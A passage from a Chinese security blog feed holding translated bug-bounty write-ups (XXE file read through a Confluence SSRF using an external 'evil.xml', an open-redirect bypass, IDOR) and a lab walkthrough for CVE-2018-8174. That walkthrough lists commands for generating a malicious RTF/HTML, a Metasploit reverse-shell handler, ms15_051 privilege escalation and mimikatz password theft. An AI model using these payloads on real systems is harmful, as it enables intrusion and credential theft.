<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</div><div class="line">&lt;!DOCTYPE root [</div><div class="line">&lt;!ENTITY % ext SYSTEM &quot;http://confluence.company.internal:8090/plugins/servlet/oauth/users/icon-uri?consumerUri=http://my_evil_site/evil.xml&quot;&gt;</div><div class="line">%ext;</div><div class="line">%ent;</div><div class="line">]&gt;</div><div class="line">&lt;r&gt;&amp;data;&lt;/r&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/15.png" alt=""></p>
<h4 id="emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来"><a href="#emsp-emsp-大家注意观察上面我标记的-no-protocal，因为读取到的目录内容是-bin-boot-dev-etc-home…-没有像之前的-gopher-localhost-一样指定任何协议类型，所以显示no-protocal，然后将读取到的内容打印出来" class="headerlink" title="&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来"></a>&emsp;&emsp;大家注意观察上面我标记的 no protocal，因为读取到的目录内容是 bin boot dev etc home….没有像之前的 gopher://localhost 一样指定任何协议类型，所以显示no protocal，然后将读取到的内容打印出来</h4><h4 id="emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是："><a href="#emsp-emsp-但是当我去读取-etc-passwd时，读取到的内容是：" class="headerlink" title="&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是："></a>&emsp;&emsp;但是当我去读取/etc/passwd时，读取到的内容是：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</div><div class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</div><div class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</div><div class="line">[…]</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"><a href="#emsp-emsp-因为文件内容是以-root-x-开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容" class="headerlink" title="&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容"></a>&emsp;&emsp;因为文件内容是以 root:x 开头，所以服务器就会误以为我指定的协议类型是root，于是服务器只是将我指定的协议打印出来了，就像先前打印gopher一样，这就导致我们不能正确读取文件内容</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/16.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/9.png" alt=""></p>
<h4 id="emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制"><a href="#emsp-emsp-通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在-file-前面添加一个-就能绕过限制" class="headerlink" title="&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制"></a>&emsp;&emsp;通过对比可以发现，当用户指定协议类型时服务端只打印出协议名字；当用户不指定协议类型时，服务端会打印出完整的内容。于是我就想到了一个很简单的绕过方法，仅仅在 %file 前面添加一个 : 就能绕过限制</h4><p>[*]攻击者服务器上的evil.xml</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % ent &quot;&lt;!ENTITY data SYSTEM &apos;:%file;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/tanslate_3/17.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第二篇翻译：URL重定向]]></title>
      <url>/2018/12/19/%E7%AC%AC%E4%BA%8C%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ADevelopers-are-lazy-or-maybe-busy/</url>
      <content type="html"><![CDATA[<h4 id="原文：Developers-are-lazy-or-maybe-busy"><a href="#原文：Developers-are-lazy-or-maybe-busy" class="headerlink" title="原文：Developers are lazy(or maybe busy)"></a>原文：<a href="https://medium.com/bugbountywriteup/open-redirect-developers-are-lazy-or-maybe-busy-6c51718b10e4" target="_blank" rel="external">Developers are lazy(or maybe busy)</a></h4><h4 id="漏洞：-符绕过造成URL重定向"><a href="#漏洞：-符绕过造成URL重定向" class="headerlink" title="漏洞：@符绕过造成URL重定向"></a>漏洞：@符绕过造成URL重定向</h4><h4 id="作者：KatsuragiCSL"><a href="#作者：KatsuragiCSL" class="headerlink" title="作者：KatsuragiCSL"></a>作者：KatsuragiCSL</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h4 id="emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"><a href="#emsp-emsp-这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！" class="headerlink" title="&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！"></a>&emsp;&emsp;这次我要写一个我在私人程序中发现的开放重定向的BUG漏洞。尽管这个BUG的危害不太严重，但是去发现它的过程却很有趣！</h4><h4 id="emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："><a href="#emsp-emsp-我们暂且定义这个网站的域名为example-com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：" class="headerlink" title="&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接："></a>&emsp;&emsp;我们暂且定义这个网站的域名为example.com，一开始我注册了一个测试账号，接着四处寻找可能存在漏洞的点，然后就发现了下面的URL链接：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://www.example.com/account/login?next=https://www.example.com</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！"><a href="#emsp-emsp-条件反射就想到了要去测试开放重定向这种类型的漏洞！" class="headerlink" title="&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！"></a>&emsp;&emsp;条件反射就想到了要去测试开放重定向这种类型的漏洞！</h4><h4 id="emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！"><a href="#emsp-emsp-首先，我尝试了最常规的payload：https-www-example-com-account-login-next-https-google-com-遗憾的是这个payload并没有生效，我没有被重定向到Google去！" class="headerlink" title="&emsp;&emsp;首先，我尝试了最常规的payload：https://www.example.com/account/login?next=https://google.com   遗憾的是这个payload并没有生效，我没有被重定向到Google去！"></a>&emsp;&emsp;首先，我尝试了最常规的payload：<a href="https://www.example.com/account/login?next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://google.com</a>   遗憾的是这个payload并没有生效，我没有被重定向到Google去！</h4><h4 id="emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用"><a href="#emsp-emsp-然后，我又尝试另一个payload：https-www-example-com-account-login-next-https-example-com-google-com-google-com-javascript-alert-1-不过这些花里胡哨的东西并没有任何作用" class="headerlink" title="&emsp;&emsp;然后，我又尝试另一个payload：https://www.example.com/account/login?next=https://example.com@google.com , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用"></a>&emsp;&emsp;然后，我又尝试另一个payload：<a href="https://www.example.com/account/login?next=https://example.com@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://example.com@google.com</a> , //google.com , javascript:alert(1)  不过这些花里胡哨的东西并没有任何作用</h4><h4 id="emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误"><a href="#emsp-emsp-最后灵犀一点，我换成这个payload之后终于有了一点反应：https-www-example-com-account-login-next-https-www-example-com-amp-next-https-google-com-但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https-example-com-2Cgoogle-com-并且浏览器还提示错误" class="headerlink" title="&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：https://example.com%2Cgoogle.com 并且浏览器还提示错误"></a>&emsp;&emsp;最后灵犀一点，我换成这个payload之后终于有了一点反应：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=https://google.com</a> 但这也仅仅只是有点反应而已，并没有实现真正的跳转，回车之后我的URL变成了：<a href="https://example.com%2Cgoogle.com" target="_blank" rel="external">https://example.com%2Cgoogle.com</a> 并且浏览器还提示错误</h4><h4 id="emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已"><a href="#emsp-emsp-尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号-2C-连接而已" class="headerlink" title="&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已"></a>&emsp;&emsp;尽管又失败了，但是此时我相信自己能够利用这个点！从上面浏览器URL的变化可以发现服务器只是过滤了第一个参数，第二个参数中的值被保留了，只不过是用了一个逗号(%2C)连接而已</h4><h4 id="emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com"><a href="#emsp-emsp-所以我又构造了最终的payload：https-www-example-com-account-login-next-https-www-example-com-amp-next-google-com" class="headerlink" title="&emsp;&emsp;所以我又构造了最终的payload：https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com"></a>&emsp;&emsp;所以我又构造了最终的payload：<a href="https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com" target="_blank" rel="external">https://www.example.com/account/login?next=https://www.example.com&amp;next=@google.com</a></h4><h4 id="emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看"><a href="#emsp-emsp-并且得到URL：https-example-com-google-com-这其实就已经将我重定向到https-www-google-com了，不信你可以访问看看" class="headerlink" title="&emsp;&emsp;并且得到URL：https://example.com,@google.com 这其实就已经将我重定向到https://www.google.com了，不信你可以访问看看"></a>&emsp;&emsp;并且得到URL：<a href="https://example.com,@google.com" target="_blank" rel="external">https://example.com,@google.com</a> 这其实就已经将我重定向到<a href="https://www.google.com了，不信你可以访问看看" target="_blank" rel="external">https://www.google.com了，不信你可以访问看看</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_2/1.gif" alt=""></p>
<h4 id="emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…"><a href="#emsp-emsp-最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…" class="headerlink" title="&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词…."></a>&emsp;&emsp;最后让作者很郁闷的是虽然登陆页面的重定向漏洞被修复了，但是当他来到注册页面，bom一模一样的漏洞依然存在，此处省略n个单词….</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第一篇翻译：越权漏洞]]></title>
      <url>/2018/12/19/%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9AChange-Anyone%E2%80%99s-profile-picture-Exploiting-IDOR/</url>
      <content type="html"><![CDATA[<h4 id="原文：Change-Anyone’s-profile-picture-Exploiting-IDOR"><a href="#原文：Change-Anyone’s-profile-picture-Exploiting-IDOR" class="headerlink" title="原文：Change Anyone’s profile picture-Exploiting IDOR"></a>原文：<a href="https://medium.com/@rupika.luhach/change-anyones-profile-picture-exploiting-idor-41369f5acf75" target="_blank" rel="external">Change Anyone’s profile picture-Exploiting IDOR</a></h4><h4 id="漏洞：未授权更改用户信息"><a href="#漏洞：未授权更改用户信息" class="headerlink" title="漏洞：未授权更改用户信息"></a>漏洞：未授权更改用户信息</h4><h4 id="作者：Rupika-Luhach"><a href="#作者：Rupika-Luhach" class="headerlink" title="作者：Rupika Luhach"></a>作者：Rupika Luhach</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h2 id="Hello-Guys"><a href="#Hello-Guys" class="headerlink" title="Hello Guys!!"></a>Hello Guys!!</h2><h4 id="emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"><a href="#emsp-emsp-这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！" class="headerlink" title="&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！"></a>&emsp;&emsp;这是我的第一篇博客文章，接下来我将给大家介绍一个在印度的Bug赏金平台官网发现的IDOR漏洞—它允许我修改任意用户的头像信息！</h4><h2 id="IDOR漏洞："><a href="#IDOR漏洞：" class="headerlink" title="IDOR漏洞："></a>IDOR漏洞：</h2><h4 id="emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"><a href="#emsp-emsp-IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。" class="headerlink" title="&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。"></a>&emsp;&emsp;IDOR将允许一名授权用户获取其他用户的信息，意指一个已经授权的用户通过更改访问时的一个参数，从而访问到了原本其并没有得到授权的对象。</h4><h4 id="上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"><a href="#上面是专业解释，看完接下来的漏洞复现流程自然就懂了！" class="headerlink" title="[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！"></a>[*] 上面是专业解释，看完接下来的漏洞复现流程自然就懂了！</h4><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><h4 id="emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者"><a href="#emsp-emsp-1-首先我创建了两个账号，Rupika-Luhach-作为攻击者账号，Test-User-充当受害者" class="headerlink" title="&emsp;&emsp;1. 首先我创建了两个账号，Rupika Luhach 作为攻击者账号，Test User 充当受害者"></a>&emsp;&emsp;1. 首先我创建了两个账号，<strong>Rupika Luhach</strong> 作为攻击者账号，<strong>Test User</strong> 充当受害者</h4><h4 id="emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85"><a href="#emsp-emsp-2-接下来我在攻击者-Rupika-Luhach-个人首页上传一张头像，然后用burpsuit-抓包观察传递的参数信息，可以发现攻击者的ID-84。同样的方法得到受害者的ID-85" class="headerlink" title="&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85"></a>&emsp;&emsp;2. 接下来我在攻击者 Rupika Luhach 个人首页上传一张头像，然后用burpsuit 抓包观察传递的参数信息，可以发现攻击者的ID=84。同样的方法得到受害者的ID=85</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/1.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/2.png" alt=""></p>
<h4 id="emsp-emsp"><a href="#emsp-emsp" class="headerlink" title="&emsp;&emsp;"></a>&emsp;&emsp;</h4><h4 id="emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85"><a href="#emsp-emsp-3-重新上传攻击者的头像，然后burpsuit-抓包，将ID参数的值更改为受害者的ID–85" class="headerlink" title="&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85"></a>&emsp;&emsp;3. 重新上传攻击者的头像，然后burpsuit 抓包，将ID参数的值更改为受害者的ID–85</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/3.png" alt=""></p>
<h4 id="emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了"><a href="#emsp-emsp-4-最后可以看到受害者Test-User的头像被篡改了" class="headerlink" title="&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了"></a>&emsp;&emsp;4. 最后可以看到受害者Test User的头像被篡改了</h4><h4 id="初始头像"><a href="#初始头像" class="headerlink" title="[*] 初始头像"></a>[*] 初始头像</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/4.png" alt=""></p>
<h4 id="篡改后的头像"><a href="#篡改后的头像" class="headerlink" title="[*] 篡改后的头像"></a>[*] 篡改后的头像</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/5.png" alt=""></p>
<h2 id="视屏演示："><a href="#视屏演示：" class="headerlink" title="视屏演示："></a>视屏演示：</h2><video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_1/videoplayback.mp4" type="video/mp4"><br></video>


<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2018-8174 漏洞复现]]></title>
      <url>/2018/06/27/CVE-2018-8174-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h2 id="0x00-序言"><a href="#0x00-序言" class="headerlink" title="0x00. 序言"></a>0x00. 序言</h2><h4 id="emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。"><a href="#emsp-emsp-漏洞描述CVE-2018-8174是-Windows-VBScript-Engine-代码执行漏洞。由于VBScript脚本执行引擎-vbscript-dll-存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位-IE浏览器及使用了IE内核的应用程序。" class="headerlink" title="&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。"></a>&emsp;&emsp;漏洞描述CVE-2018-8174是 Windows VBScript Engine 代码执行漏洞。由于VBScript脚本执行引擎(vbscript.dll)存在代码执行漏洞，攻击者可以将恶意的VBScript嵌入到Office文件或者网站中，一旦用户不小心点击，远程攻击者可以获取当前用户权限执行脚本中的恶意代码，该漏洞影响最新版本的32位 IE浏览器及使用了IE内核的应用程序。</h4><a id="more"></a>
<h2 id="0x01-操作演示"><a href="#0x01-操作演示" class="headerlink" title="0x01. 操作演示"></a>0x01. 操作演示</h2><h4 id="1-下载EXP到kali-，生成木马文件，启动msf监听"><a href="#1-下载EXP到kali-，生成木马文件，启动msf监听" class="headerlink" title="1. 下载EXP到kali ，生成木马文件，启动msf监听"></a>1. 下载EXP到kali ，生成木马文件，启动msf监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/iBearcat/CVE-2018-8174_EXP.git</div><div class="line">cd CVE-2018-8174_EXP/</div><div class="line">python CVE-2018-8174.py -u http://192.168.1.111/exploit.html -o exploit.rtf -i 192.168.1.111 -p 4444</div><div class="line">cp exploit.html /var/www/html/</div><div class="line">service apache2 start</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">msfconsole</div><div class="line">use exploit/multi/handler</div><div class="line">set payload windows/shell/reverse_tcp</div><div class="line">set lhost 192.168.1.111</div><div class="line">set lport 4444</div><div class="line">run</div></pre></td></tr></table></figure>
<h4 id="2-靶机访问-http-192-168-1-111-exploit-html"><a href="#2-靶机访问-http-192-168-1-111-exploit-html" class="headerlink" title="2. 靶机访问 http://192.168.1.111/exploit.html"></a>2. 靶机访问 <a href="http://192.168.1.111/exploit.html" target="_blank" rel="external">http://192.168.1.111/exploit.html</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212802_F7I75O_Screenshot.jpeg" alt=""></p>
<h4 id="3-先将-shell-转换为-meterpreter-，再利用ms15-051提权"><a href="#3-先将-shell-转换为-meterpreter-，再利用ms15-051提权" class="headerlink" title="3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权"></a>3. 先将 shell 转换为 meterpreter ，再利用ms15_051提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">sessions -u 2</div><div class="line">use windows/local/ms15_051_client_copy_image</div><div class="line">set session 3</div><div class="line">run</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627211559_Tkq5fo_Screenshot.jpeg" alt=""></p>
<h4 id="4-利用mimikatz-盗取明文密码"><a href="#4-利用mimikatz-盗取明文密码" class="headerlink" title="4. 利用mimikatz 盗取明文密码"></a>4. 利用mimikatz 盗取明文密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180627212029_bxawG8_Screenshot.jpeg" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL注入导图]]></title>
      <url>/2018/06/04/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/</url>
      <content type="html"><![CDATA[<h4 id="本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！"><a href="#本图来自信安之路学生渗透小组-辽宁-web-TwoDog-博主觉得这张图画的很好，所以贴在这里提供参考！" class="headerlink" title="本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！"></a>本图来自信安之路学生渗透小组@辽宁-web-TwoDog, 博主觉得这张图画的很好，所以贴在这里提供参考！</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/SQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E5%9B%BE/20180604110147_oMGlv3_B11A99714D2D907A004073CD49DA4CB6.jpeg" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[漫谈攻击链--从webshell到域控的奇妙之旅]]></title>
      <url>/2018/06/04/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE-%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/</url>
      <content type="html"><![CDATA[<h2 id="0x00-引言"><a href="#0x00-引言" class="headerlink" title="0x00. 引言"></a>0x00. 引言</h2><h4 id="emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"><a href="#emsp-emsp-做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！" class="headerlink" title="&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。本文已投freebuf，禁止转载！"></a>&emsp;&emsp;做渗透测试时遇到的域环境经常就是要么太复杂我们搞不定，要么太简单进去就拿到域控没啥意思，这些显然都无法满足我们实践已掌握知识的刚需。同时为了给我们道格安全技术小组的小伙伴们搭建线下实战环境，笔者索性自己搭建了一套完整的域环境，通过实战时遇到的一些坑来配备合适的漏洞，让域渗透不再神秘，也大大增加我们对知识的理解程度，下面我将为大家揭露从web到域控的奇妙旅程！文末有相关下载链接。<a href="http://www.freebuf.com/articles/network/172578.html" target="_blank" rel="external">本文已投freebuf，禁止转载！</a></h4><a id="more"></a>
